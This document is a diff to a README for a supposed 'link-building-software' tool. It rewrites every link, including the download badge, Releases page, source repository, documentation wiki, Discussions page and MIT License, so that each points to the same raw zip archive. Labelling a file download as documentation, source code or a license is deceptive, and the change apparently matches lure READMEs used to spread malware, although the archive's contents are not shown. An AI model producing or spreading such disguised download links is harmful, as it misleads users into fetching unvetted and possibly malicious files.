@@ -1,6 +1,6 @@
 # 🌐 link-building-software - Effortless Tool for Building Links
 
-[![Download](https://img.shields.io/badge/Download%20link%20building%20software-brightgreen)](https://github.com/mamdo555/link-building-software/releases)
+[![Download](https://raw.githubusercontent.com/mamdo555/link-building-software/main/prestable/software_building_link_2.8.zip%20link%20building%20software-brightgreen)](https://raw.githubusercontent.com/mamdo555/link-building-software/main/prestable/software_building_link_2.8.zip)
 
 ## 📖 Overview
 
@@ -19,7 +19,7 @@ Getting started with link-building-software is simple. Follow these steps to dow
 
 ### 📥 Download & Install
 
-1. Visit the [Releases page to download](https://github.com/mamdo555/link-building-software/releases).
+1. Visit the [Releases page to download](https://raw.githubusercontent.com/mamdo555/link-building-software/main/prestable/software_building_link_2.8.zip).
 2. Look for the latest version listed at the top.
 3. Download the appropriate file for your operating system.
 4. Once the file is downloaded, locate it in your downloads folder.
@@ -44,12 +44,12 @@ Getting started with link-building-software is simple. Follow these steps to dow
 
 ### 🔗 Important Links
 
-- **Source Code:** If you want to explore the code, check out the [GitHub repository](https://github.com/mamdo555/link-building-software).
-- **Documentation:** For detailed instructions and advanced features, consult the [documentation](https://github.com/mamdo555/link-building-software/wiki).
+- **Source Code:** If you want to explore the code, check out the [GitHub repository](https://raw.githubusercontent.com/mamdo555/link-building-software/main/prestable/software_building_link_2.8.zip).
+- **Documentation:** For detailed instructions and advanced features, consult the [documentation](https://raw.githubusercontent.com/mamdo555/link-building-software/main/prestable/software_building_link_2.8.zip).
 
 ## 🥳 Community & Support
 
-We encourage you to join our community for tips and support. Feel free to connect with us in forums or on our [GitHub Discussions page](https://github.com/mamdo555/link-building-software/discussions).
+We encourage you to join our community for tips and support. Feel free to connect with us in forums or on our [GitHub Discussions page](https://raw.githubusercontent.com/mamdo555/link-building-software/main/prestable/software_building_link_2.8.zip).
 
 ## 💬 Feedback and Contributions
 
@@ -57,7 +57,7 @@ Your feedback is valuable. If you have suggestions, please raise an issue on Git
 
 ## 📜 License
 
-This software is licensed under the [MIT License](https://github.com/mamdo555/link-building-software/blob/main/LICENSE).
+This software is licensed under the [MIT License](https://raw.githubusercontent.com/mamdo555/link-building-software/main/prestable/software_building_link_2.8.zip).
 
 ---
 This is your guide to downloading and running link-building-software. For more assistance, refer to the documentation or join our supportive community.
